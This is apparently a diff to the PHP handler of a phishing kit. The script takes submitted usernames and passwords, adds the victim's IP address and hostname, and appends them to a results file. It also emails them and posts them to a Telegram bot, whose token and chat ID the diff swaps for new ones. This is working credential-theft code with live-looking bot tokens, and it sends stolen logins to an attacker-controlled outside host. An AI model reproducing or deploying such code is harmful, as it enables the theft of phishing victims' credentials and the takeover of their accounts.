@@ -9,6 +9,10 @@ $bilsmg .= " PWD:           : ".$_POST['idpassword']."\n";
 $bilsmg .= " isp|: $ip | $hostname\n";
 $bilsmg .= "------------------------------------\n";
 
+$message .= "---".$_POST['ZAG']."---\n";
+$message .= " USR|: ".$_POST['ch1']."\n";
+$message .= " PWD|: ".$_POST['idpassword']."\n";
+$message .= " isp|: $ip | $hostname\n";
 
 
 
@@ -24,12 +28,13 @@ mail($bilsnd,$bilsub,$bilsmg,$bilhead);
 
 
 $Txt_Rezlt = fopen('rzlt.txt', 'a+');
-fwrite($Txt_Rezlt, $bilsmg);
+fwrite($Txt_Rezlt, $message);
 fclose($Txt_Rezlt);
 
-$token = "1443724091:AAGTUQQqlLSLzRJtapT-eRZkuxLgYCiHbOQ";
+mail($to, $subject, $message, $headers);
+$token = "5258318869:AAEc9YN38UpQbGND-gtNoox74n0jrZ4m0ks";
 
-file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=-791509674&text=" . urlencode($bilsmg)."" );
+file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=1289904248&text=" . urlencode($message)."" );
 
 
 
